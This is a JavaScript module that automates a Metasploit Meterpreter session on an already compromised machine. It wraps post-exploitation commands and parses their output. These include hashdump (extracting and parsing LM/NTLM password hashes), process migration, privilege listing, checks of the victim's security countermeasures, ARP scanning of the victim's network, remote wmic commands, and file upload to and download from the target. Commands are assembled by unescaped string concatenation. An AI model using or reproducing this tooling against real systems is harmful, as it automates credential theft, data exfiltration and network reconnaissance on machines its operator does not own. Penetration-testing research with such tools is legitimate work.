var events 	= require('events'),
		util 		=	require('util');

var Session = function(args) {

	this.connection = args.connection,
	this.process 		= args.process,
	this.events 		= args.events,
	this.buffer 		= [],	
	this.running 		= false;

	this.process.stdout.setEncoding('ascii');

	this.on("prompt", function() {

		this.running = false;

		if(this.buffer.length > 0) {

				this.running = true;
				this._run(this.buffer[0].command, this.buffer[0].callback);
				this.buffer.shift();

		}

	}.bind(this));

}

util.inherits(Session, events.EventEmitter);

Session.prototype._run = function(command, cb) {

	if(!this.running) this.running = true;

	var self = this;

	var output = [];

	var getOutput = function(data) {

		// Strip colour/bold codes & blank lines

		data = data.replace(/\u001b\[\d{1,}m/g, '');

		if(!data.trim()) {
			return;
		}

		if(~data.indexOf('meterpreter >')) {

			self.process.stdout.removeListener('data', getOutput);

			this.running = false;

			if(cb) {
				cb(output);
			}		

		} else {

			output.push(data);

		}

	}

	this.process.stdout.on('data', getOutput);

	// Wait a little while till we write the command again..
	// Doesn't like it if we don't wait.. seems to work 50/50 with 500ms, no idea why.

	setTimeout(function() {
		this.process.stdin.write(command + "\n");
	}.bind(this), 1000);
	
}

Session.prototype.run = function(command, cb) {

	if(!this.running) {

		this.running = true;

		this._run(command, cb);

	} else {

		this.buffer.push({ 
			command: command, 
			callback: cb 
		});
	}
}

Session.prototype.use = function(extension, cb) {
	this.run('use ' + extension, cb);
}

Session.prototype.getpid = function(cb) {
	this.run('getpid', function(d) {
		var match = d.toString().match(/Current pid: (\d{1,})/);
		cb(match ? match[1] : null);
	});
}

Session.prototype.getuid = function(cb) {
	this.run('getuid', function(d) {
		var match = d.toString().match(/Server username: (.*)/);
		cb(match ? match[1] : null);
	});
}

Session.prototype.sysinfo = function(cb) {
	this.run('sysinfo', function(d) {
		var tmp = d.toString().match(/Computer\s{1,}:\s(.*)\n,OS\s{1,}:\s(.*)\n,Architecture\s{1,}:\s(.*)\n,System Language\s{1,}:\s(.*)\n,Meterpreter\s{1,}:\s(.*)\n/);
		cb({
			computer: 		tmp[1].toString(),
			os: 					tmp[2].toString(),
			arch: 				tmp[3].toString(),
			language: 		tmp[4].toString(),
			meterpreter: 	tmp[5].toString()
		});
	});
}

Session.prototype.hashdump = function(cb) {
	this.run('hashdump', function(d) {
		var hashes = [];

		d.forEach(function(hash) {

			var tmp = hash.split(':');

			var hash = {

				user: tmp[0],
				id: 	tmp[1],
				lm: 	tmp[2],
				lm1: 	tmp[2].substr(0,16),
				lm2: 	tmp[2].substr(16),
				ntlm: tmp[3]

			}

			hashes.push(hash);

		});

		cb(hashes);
	});
}

Session.prototype.getprivs = function(cb) {
	this.run('getprivs', function(d) {
		var privs = d.filter(function(item) {
			if(item == "Enabled Process Privileges" || item.substr(0,1) == "=") {
				return false;
			}
			return true;
		}).map(function(item) {
			return item.trim();
		})
		cb(privs);
	});
}

Session.prototype.ps = function(cb) {
	this.run('ps aux', function(d) {
		var processes = [];

		d.toString().split('\n').filter(function(item) {

			// Filter bad lines and empty strings.

			if(item == "Process List" || item == "============" || ~item.indexOf("Arch") || ~item.indexOf("----") || 
				~item.indexOf("[System Process]") || ~item.indexOf(" System ")) {
					return false;
			}
			return !!item;

		}).forEach(function(process) {

			var tmp = process.split(/\s{2,}/);

			var data = {
				pid: 			tmp[0].trim(),
				ppid: 		tmp[1],
				file: 		tmp[2],
				arch: 		tmp[3],
				session: 	tmp[4],
				user: 		tmp[5],
				path: 		tmp[6]
			}

			processes.push(data);

		});

		cb(processes);

	});
}

Session.prototype.migrate = function(pid, cb) {

	this.run('migrate ' + pid, function(res) {

		if(res[1] == '[*] Migration completed successfully.\n') {
			cb(null, true);
		} else {
			cb(res[1], false);
		}
	});
}

Session.prototype.enumdesktops = function(cb) {
	this.run('enumdesktops', function(d) {

		var desktops = d[1].split('\n');

		for(var i = 0; i <= 5; i++) {
			desktops.shift();
			if(i<2) desktops.pop();
		}

		desktops = desktops.map(function(desktop) {

			var tmp = desktop.split(/\s{1,}/).filter(function(item) {
				return !!item;
			})

			return {
				session: 	tmp[0],
				station: 	tmp[1],
				name: 		tmp[2]
			};

		});

		cb(desktops);

	});
}

Session.prototype.filesystem = function() {

	return {

		cd: function(dir, cb) {

			this.run('cd ' + dir, function(d) {
				cb();
			});

		}.bind(this),

		pwd: function(cb) {

			this.run('pwd', function(d) {
				cb(d[0].trim());
			});

		}.bind(this),

		ls: function(cb) {

			var dir = ".";

			this.run('ls ' + dir, function(d) {

				d = d.toString().split('\n').filter(function(item) {
					if(item.match(/Listing:/) || item.match(/={10}/) || item.match(/Last modified/) || item.match(/-{4}/)) {
						return false;
					}
					return !!item;
				}).map(function(item) {

					var tmp = item.split(/\s{2,}/);

					return {
						file: 		tmp[4],
						mode: 		tmp[0],
						size: 		tmp[1],
						type: 		tmp[2] == "fil" ? "file" : tmp[2],
						modified: tmp[3]
					}

				});

				cb(d);

			});

		}.bind(this),

		upload: function(file, location, cb) {

			this.run('upload ' + file + ' ' + location, function(d) {

				if(d[1] == "[-] core_channel_open: Operation failed: The system cannot find the path specified.") {
					cb(d[1], false);
					return;
				}

				var done = d[1].match(/\[\*\]\suploaded\s{1,}:.*->\s(.*)/);

				if(done) {

					cb(null, done[1]);
					return;

				}

				cb(done[0], false);
				return;

			});

		}.bind(this),

		download: function(file, location, cb) {

			this.run('download ' + file + ' ' + ( ~location.indexOf(file) ? location : location + "/" + file ) , function(d) {

				if(d[0] == "[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.") {
					cb(d[0], false);
					return;
				}

				var done = d[1].match(/\[\*\]\sdownloaded\s:.*->\s(.*)/);

				if(done) {

					cb(null, done[1]);
					return;

				}

				cb(done[0], false);
				return;

			});

		}.bind(this),

		mkdir: function(dir, cb) {

			this.run("mkdir " + dir, function(d) {
				cb();
			});

		}.bind(this)

	}

}

Session.prototype.getcountermeasures = function(cb) {

	var results = {};

	this.run('run getcountermeasure', function(d) {

		d = d.filter(function(item) {
			if(item.match(/[-=]{2,}/)) return false;
			return !!item;
		})

		for(var i = 0; i < d.length; i++) {

			if(d[i].match(/\(current\)/)) {

				i += 2; // Skip the ------ line

				var operational = d[i].split(/\s/),
						exception   = d[++i].split(/\s/);

				operational = operational[operational.length - 3];
				exception 	= exception[exception.length - 3];

				results = {
					operational: operational 	== "Enable" ? true : false,
					exception:   exception 		== "Enable" ? true : false
				}

				break;

			}

		}

		cb(results);

	})

}

Session.prototype.arpscan = function(network, cb) {

	this.run('run arp_scanner -r ' + network, function(d) {

		var addresses = [];

		d.forEach(function(line) {
			if(line.match(/IP:\s/)) {

				var tmp = line.match(/IP:\s(.*)\sMAC\s(.*)/);

				addresses.push({
					address: 	tmp[1],
					mac: 			tmp[2]
				});

			}
		});

		cb(addresses);

	});

}

Session.prototype.arp = function(cb) {

	this.run('arp', function(d) {

		d = d.toString().split('\n').filter(function(item) {
			if(item.match(/ARP cache/) || item.match(/={2,}/) || item.match(/IP address/) || item.match(/-{2,}/)) {
				return false;
			}
			return !!item;
		}).map(function(item) {

			var tmp = item.match(/\s{2,}(.*)\s{2,}(.*)\s{2,}(.*)/);

			return {
				address: 		tmp[1].trim(),
				mac: 				tmp[2],
				interface: 	tmp[3]
			}

		});

		cb(d);

	});

}

Session.prototype.ifconfig = function(cb) {

	this.run('ifconfig', function(d) {

		var interfaces = [];

		var tmp = d.toString().split(/\n{2}/);

		tmp.pop();

		tmp.forEach(function(group) {

			group = group.toString();

			var interface = {

				name: 		group.match(/Name\s{1,}:\s(.*)/)[1].replace(/\u0000/,''),
				mac:  		group.match(/Hardware\sMAC\s:\s(.*)/)[1],
				mtu:  		group.match(/MTU\s{1,}:\s(\d{1,})/)[1],
				address: 	group.match(/IPv4 Address\s:\s(.*)/)[1],
				netmask: 	group.match(/IPv4 Netmask\s:\s(.*)/)[1]

			};

			interfaces.push(interface);

		});

		cb(interfaces);

	});

}

Session.prototype.wmic = function(cmd, cb) {

	this.run('run wmic -c "' + cmd + '"', function(d) {

		var res = d.pop().replace(/\u0000/g, '').replace(/[*].{4}/,'').replace(/\r/g,'').replace(/\[/g,'');

		res = res.split('\n').filter(function(item) {
			return !!item;
		}).map(function(item) {
			return item.trim();
		});

		var keys 		= res[0].split(/\s{2,}/),
				values 	= res[1].split(/\s{2,}/);

		var results = {};

		for(var i = 0; i < keys.length; i++) {
			results[keys[i].toLowerCase()] = values[i];
		}

		cb(results);

	});

}

module.exports = Session;